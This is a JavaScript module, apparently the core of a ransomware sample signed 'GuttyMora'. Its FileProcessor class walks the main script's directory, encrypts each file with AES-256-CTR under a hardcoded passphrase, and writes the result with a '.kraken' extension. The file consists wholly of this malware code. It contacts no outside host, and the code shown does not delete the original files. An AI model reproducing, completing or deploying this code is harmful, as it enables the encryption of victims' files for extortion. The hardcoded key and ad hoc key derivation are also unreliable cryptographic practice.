// With ❤ by GuttyMora
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const {Buffer} = require('buffer');

const DEFAULT_DIRECTORY_NAME = require.main.filename;

class FileProcessor {
    async getFiles(folder = null) {
        console.log('[FileProcessor] - getFiles()');

        const directoryPath = path.join(path.dirname(DEFAULT_DIRECTORY_NAME), folder ?? '');
        return await new Promise((resolve, reject) => {
            fs.readdir(directoryPath, async (err, files) => {
                if (err) {
                    console.error('[!] Unable to read directory:', err);
                    reject(null);
                } else {
                    const fileList = [];
                    for (const file of files) {
                        const stats = await this.getFileStats(file);
                        fileList.push({
                            name: file,
                            directoryPath: directoryPath,
                            isDirectory: stats.isDirectory(),
                            stats: stats
                        });
                    }
                    resolve([directoryPath, fileList]);
                }
            })
        });
    }

    async getFileStats(filePath) {
        return await new Promise((resolve, reject) => {
            fs.stat(filePath, (err, stats) => {
                if (err) {
                    console.error('[!] Unable to get file stats:', err);
                    reject(null);
                } else {
                    resolve(stats);
                }
            })
        });
    }

    async encrypt(file) {
        console.log('[FileProcessor] - encrypt()');

        return await new Promise((resolve, reject) => {
            fs.readFile(`${file.directoryPath}\\${file.name}`, 'utf8', async (err, data) => {
                if (err) {
                    console.error('[!] Unable to read file:', err);
                    reject(null);
                } else {
                    const algorithm = 'aes-256-ctr';
                    let key = 'GuttyMora1234';
                    key = crypto.createHash('sha256').update(key).digest('base64').substr(0, 32);

                    // initialization vector
                    const iv = crypto.randomBytes(16);
                    // Create a new cipher using the algorithm, key, and iv
                    const cipher = crypto.createCipheriv(algorithm, key, iv);

                    // Create the new (encrypted) buffer
                    const buffer = Buffer.concat([iv, cipher.update(data), cipher.final()]);

                    const encryptedFileName = await this.createEncryptFile((file.name.split('.')[0]), buffer);
                    resolve(encryptedFileName);
                }
            });
        });
    }

    async createEncryptFile(fileName, buffer) {
        console.log('[FileProcessor] - createEncryptFile()');

        const path = `${fileName}.kraken`;
        const fileDescriptor = fs.openSync(path, 'w');
        fs.writeSync(fileDescriptor, buffer, 0, buffer.length, null);

        return path;
    }
}

module.exports = FileProcessor;
